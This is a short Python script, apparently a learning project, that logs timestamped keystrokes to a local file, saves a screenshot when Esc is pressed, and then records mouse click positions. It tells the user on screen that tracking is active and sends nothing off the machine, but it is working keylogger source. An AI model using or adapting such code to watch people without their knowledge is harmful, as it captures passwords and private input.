# Description: This program is a key logger with a timestamp and a mouse clicker tracker that can take screenshots
# The key logger runs but once the user presses the Esc button the system takes a screenshot and then switches to a mouse clicker tracker
from pynput.keyboard import Key, Listener # allows control and monitor of input devices
import logging # logs the messages that are desired
from pynput import mouse # handles the mouse
import pyautogui # control the mouse and keyboard to automate interactions with other applications
import numpy as np # works with arrays
import cv2 # solves computer vision (need numpy with cv2 b/c of arrays)
import keyboard

print("This system is now tracking your key strokes. ")
print("Press the Esc key to take a screenshot and switch to the mouse tracker.")
print("Press the Esc key when ready to switch!")

log_dir = '' # create an empty log directory
logging.basicConfig(filename=(log_dir + 'Keylogger_MouseTracker_Project.txt'),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
# add KeyLogger_MouseTracker_Project.txt file to log time stamps of the keystrokes
# basicConfig - configures the logging to ensure that at least one handler is available
# asctime - converts a tuple representing a time as returned

def key_press(keyboard): # defines the function key_press which logs the pressing of the keyboard and adds the parameter keyboard
    logging.info('{0} was pressed by the keyboard of the user.'.format(keyboard)) # prints the statement of what key was pressed by the user
    pass # place holder

def key_release(keyboard): # defines the function key_release which logs the release of the keyboard and adds the paremeter keyboard
    logging.info('{0} was released by the keyboard of the user.'.format(keyboard)) # prints the statement of what key was released by the user
    if keyboard == Key.esc: # if the user pressed the "esc" on the keyboard
        print("The system just took a screenshot and will be tracking your mouse clicks!")
        return False # it will end the keylogger and move onto the mouse tracker

# Press esc to switch to the mouse tracker

def on_click(x, y, button, pressed): # defines the function on_click which shows where the mouse was clicked and unclicked at a certain location (x, y)
    global click_counter
    logging.info("{0} at {1}".format("The mouse was clicked" if pressed else "The mouse was released", (x,y))) # prints the statement of where the mouse was clicked and unclicked

with Listener(on_press=key_press, on_release=key_release) as keyboard_strokes: # collects the events and these methods can now run
    keyboard_strokes.join() # joins to the main thread
    image = pyautogui.screenshot() # creates the variable of the image and takes a screenshot of the screen
    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR) # convert to a numpy array so we can write it to the disk
    cv2.imwrite("image1.png", image) # creates the ".png" disk for the screenshot to be save to this project

with mouse.Listener(on_click=on_click) as mouse_listener: # collects the events and these methods can now run
    mouse_listener.join() # joins to the main thread

